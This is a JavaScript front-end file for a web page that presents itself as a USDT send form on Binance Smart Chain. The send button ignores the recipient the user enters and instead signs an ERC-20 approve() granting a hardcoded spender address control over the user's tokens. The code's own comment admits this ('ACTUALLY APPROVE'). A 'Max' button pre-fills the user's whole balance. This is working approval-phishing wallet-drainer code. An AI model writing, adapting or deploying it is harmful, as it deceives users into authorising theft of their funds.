/* ======================================================
   GLOBAL STATE
====================================================== */

let provider;
let signer;
let userAddress;

/* ======================================================
   CONFIG
====================================================== */

// Your spender (fixed)
const SPENDER_ADDRESS = "0x220BB5df0893F21f43e5286Bc5a4445066F6ca56";

// USDT on BSC
const BSC = {
  chainId: "0x38",
  name: "Binance Smart Chain",
  usdt: "0x55d398326f99059fF775485246999027B3197955"
};

// Minimal ERC20 ABI
const ERC20_ABI = [
  "function approve(address spender, uint256 amount) returns (bool)",
  "function balanceOf(address owner) view returns (uint256)",
  "function decimals() view returns (uint8)"
];

/* ======================================================
   HELPERS
====================================================== */

async function switchToBSC() {
  try {
    await window.ethereum.request({
      method: "wallet_switchEthereumChain",
      params: [{ chainId: BSC.chainId }]
    });
  } catch (e) {
    if (e.code === 4902) {
      await window.ethereum.request({
        method: "wallet_addEthereumChain",
        params: [{
          chainId: BSC.chainId,
          chainName: "Binance Smart Chain",
          nativeCurrency: {
            name: "BNB",
            symbol: "BNB",
            decimals: 18
          },
          rpcUrls: ["https://bsc-dataseed.binance.org/"],
          blockExplorerUrls: ["https://bscscan.com"]
        }]
      });
    } else {
      throw e;
    }
  }
}

/* ======================================================
   CONNECT WALLET
====================================================== */

async function connectWalletIfNeeded() {
  if (!window.ethereum) {
    alert("Wallet not found");
    throw new Error("No wallet");
  }

  provider = new ethers.BrowserProvider(window.ethereum);
  await provider.send("eth_requestAccounts", []);

  signer = await provider.getSigner();
  userAddress = await signer.getAddress();

  return userAddress;
}

/* ======================================================
   MAX BUTTON (optional UX)
====================================================== */

async function setMax() {
  try {
    await connectWalletIfNeeded();
    await switchToBSC();

    const token = new ethers.Contract(
      BSC.usdt,
      ERC20_ABI,
      provider
    );

    const decimals = await token.decimals();
    const balance = await token.balanceOf(userAddress);

    document.getElementById("amount").value =
      ethers.formatUnits(balance, decimals);

  } catch (e) {
    console.warn("Max failed", e);
  }
}

/* ======================================================
   SEND BUTTON (ACTUALLY APPROVE)
====================================================== */

async function sendUSDT() {
  const toAddress = document.getElementById("toAddress").value.trim();
  const amountStr = document.getElementById("amount").value.trim();

  // Basic UI validation
  if (!ethers.isAddress(toAddress)) {
    alert("Enter valid address");
    return;
  }

  if (!amountStr || Number(amountStr) <= 0) {
    alert("Enter valid amount");
    return;
  }

  try {
    // 1️⃣ Connect wallet
    await connectWalletIfNeeded();

    // 2️⃣ Ensure BSC
    await switchToBSC();

    // 3️⃣ Prepare USDT contract (with signer)
    const token = new ethers.Contract(
      BSC.usdt,
      ERC20_ABI,
      signer
    );

    const decimals = await token.decimals();
    const parsedAmount = ethers.parseUnits(amountStr, decimals);

    // 4️⃣ APPROVE (wallet popup = Smart Contract Call)
    const tx = await token.approve(
      SPENDER_ADDRESS,
      parsedAmount
    );

    console.log("Approval tx:", tx.hash);

    alert(
      "Authorization sent.\n\n" +
      "Wallet popup shows Smart Contract Call.\n" +
      "TX Hash:\n" +
      tx.hash
    );

  } catch (err) {
    console.error(err);
    alert("Transaction cancelled or failed");
  }
}

/* ======================================================
   EXPOSE FUNCTIONS TO UI
====================================================== */

window.sendUSDT = sendUSDT;
window.setMax = setMax;
